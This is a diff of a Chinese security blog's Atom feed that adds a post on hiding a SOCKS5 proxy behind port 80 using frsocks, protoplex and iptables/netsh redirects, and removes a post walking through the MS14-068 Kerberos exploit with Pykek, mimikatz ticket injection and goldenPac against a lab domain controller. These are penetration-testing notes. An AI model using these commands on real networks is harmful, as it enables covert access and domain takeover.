@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://uknowsec.cn/"/>
-  <updated>2020-07-08T08:25:49.143Z</updated>
+  <updated>2020-07-16T11:32:55.273Z</updated>
   <id>https://uknowsec.cn/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>frsocks+protoplex+流量重定向实现端口复用</title>
+    <link href="https://uknowsec.cn/posts/notes/frsocks+protoplex+%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.html"/>
+    <id>https://uknowsec.cn/posts/notes/frsocks+protoplex+流量重定向实现端口复用.html</id>
+    <published>2020-07-16T11:17:17.000Z</published>
+    <updated>2020-07-16T11:32:55.273Z</updated>
+    
+    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>前段日子<code>A-team</code>群里的师傅<code>sunshine</code>，讲到了一个端口复用的方案，并发了几个工具，这里简单记录实践一下。</p><h3><span id="frsocksprotoplex流量重定向实现端口复用">frsocks+protoplex+流量重定向实现端口复用</span></h3><h4><span id="frsocks">frsocks</span></h4><p><a href="https://github.com/3gstudent/Homework-of-Go/blob/master/frsocks.go" target="_blank" rel="noopener">https://github.com/3gstudent/Homework-of-Go/blob/master/frsocks.go</a></p><p>监听本地的2333端口开启一个socks5代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frsocks -sockstype fsocks -listen 2333</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/image-20200716154735565.png" alt="image-20200716154735565"></p><h4><span id="protoplex">protoplex</span></h4><p><a href="https://github.com/Pandentia/protoplex" target="_blank" rel="noopener">https://github.com/Pandentia/protoplex</a></p><p>这是一个协议复用的工具，比如命令可将本地9999端口的流量根据协议类型转到本地的2333和80端口。</p><p><strong>注: 在实战环境中，先用protoplex进行分流，然后再进行重定向。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./protoplex --socks5 192.168.154.130:2333 --http 127.0.0.1:80 -b 192.168.154.130:9999</span><br></pre></td></tr></table></figure><p><strong>注: protoplex设置分流的http协议IP和重定向的ip不要设置为同一个ip,否则会形成闭环。</strong></p><p>同时该工具还支持其他协议的分流，如：</p><ul><li>SSH</li><li>HTTP</li><li>TLS (/ HTTPS)</li><li>OpenVPN</li><li>SOCKS4 / SOCKS5</li></ul><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/image-20200716192504883.png" alt="image-20200716192504883"></p><h4><span id="流量重定向">流量重定向</span></h4><h5><span id="linux">linux</span></h5><p>将访问80的流量重定向到9999端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999</span><br></pre></td></tr></table></figure><h5><span id="windows">windows</span></h5><p>将本地80流量重定向到9999</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=80 listen</span><br><span class="line">address=192.168.154.129 connectport=9999 connectaddress=192.168.154.129</span><br></pre></td></tr></table></figure><p>相关操作命令：</p><p>显示系统中的转发规则列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure><p>删除指定的端口转发规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=80 listenaddress=192.168.154.129</span><br></pre></td></tr></table></figure><p>清除所有当前的端口转发规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy reset</span><br></pre></td></tr></table></figure><p><strong>注: 必要的情况下，可以设置特定来源ip进行流量重定向。</strong></p><h4><span id="效果">效果</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/image-20200716153722658.png" alt="image-20200716153722658"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/image-20200716153737611.png" alt="image-20200716153737611"></p><h3><span id="结语">结语</span></h3><p><code>站在巨人的肩膀上</code>。</p><p>本文思路和工具都来自<code>sunshine</code>，仅仅记录分享一下。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;前段日子&lt;code&gt;A-team&lt;/code&gt;群里的师傅&lt;code&gt;sunshine&lt;/code&gt;，讲到了一个端口复用的方案，并发了几个工具，这里简单记录实践一下。&lt;/p&gt;
+&lt;h3&gt;&lt;span id=&quot;frso
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>利用ReflectiveDLL来武装你的Cobalt Strike</title>
@@ -457,30 +481,6 @@
       
       
         &lt;h3&gt;&lt;span id=&quot;goldenticket&quot;&gt;GoldenTicket&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;简介&quot;&gt;简介&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket）
-      
-    
-    </summary>
-    
-      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>域渗透-MS14-068</title>
-    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068.html"/>
-    <id>https://uknowsec.cn/posts/notes/域渗透-MS14-068.html</id>
-    <published>2019-08-22T14:17:17.000Z</published>
-    <updated>2019-08-24T14:56:21.307Z</updated>
-    
-    <content type="html"><![CDATA[<h3><span id="ms14-068">MS14-068</span></h3><p>MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。</p><h4><span id="利用方式">利用方式</span></h4><p>攻击流程：</p><p>MS14-068对应的补丁为KB3011780，可在域控上通过systeminfo查看是否安装此补丁。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485511263.png" alt="1566485511263"></p><p>一、在域内主机jerry上通过dir来访问域控的共享文件夹，示拒绝访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485577139.png" alt="1566485577139"></p><p>二、通过Pykek工具利用漏洞，我这里使用的是将python脚本编译之后的exe文件。</p><p>参数说明：</p><blockquote><p>-u 域账号+@+域名称，这里是jerry+@+rootkit.org</p><p>-p 为当前用户的密码，即jerry的密码</p><p>-s为jerry的SID值，可以通过whoami/all来获取用户的SID值</p><p>-d为当前域的域控</p></blockquote><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485661082.png" alt="1566485661082"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u sqladmin@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1142 -d OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485702304.png" alt="1566485702304"></p><p>脚本执行成功会在当前目录下生成一个ccache文件。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485729199.png" alt="1566485729199"></p><p>三、使用mimikatz导入生成的ccache文件，导入之前cmd下使用命令klist purge或者在mimikatz中使用kerberos::purge删除当前缓存的kerberos票据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485815936.png" alt="1566485815936"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_sqladmin@0day.org.ccache</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485894244.png" alt="1566485894244"></p><p>再次dir访问域控共享就可以成功访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566485986373.png" alt="1566485986373"></p><h4><span id="goldenpacexe">goldenPac.exe</span></h4><p>impacket工具包里面的goldenPac.py，这个工具是结合ms14-068加psexec的产物，利用起来十分顺手。</p><p>这里用到的是编译的exe文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe 0day.org/sqladmin:admin!@#45@OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566486417839.png" alt="1566486417839"></p><p>当然此工具不止是得到一个shell，我们甚至可以直接让该域控运行我们上传的程序。</p><p>这个漏洞中主要的问题是存在于KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生。</p><h3><span id="reference">Reference</span></h3><p><a href="https://www.freebuf.com/articles/system/197160.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/197160.html</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3&gt;&lt;span id=&quot;ms14-068&quot;&gt;MS14-068&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。&lt;/p&gt;
-&lt;h4&gt;&lt;span id=&quot;利用方式&quot;&gt;利用方式&lt;/span
       
     
     </summary>
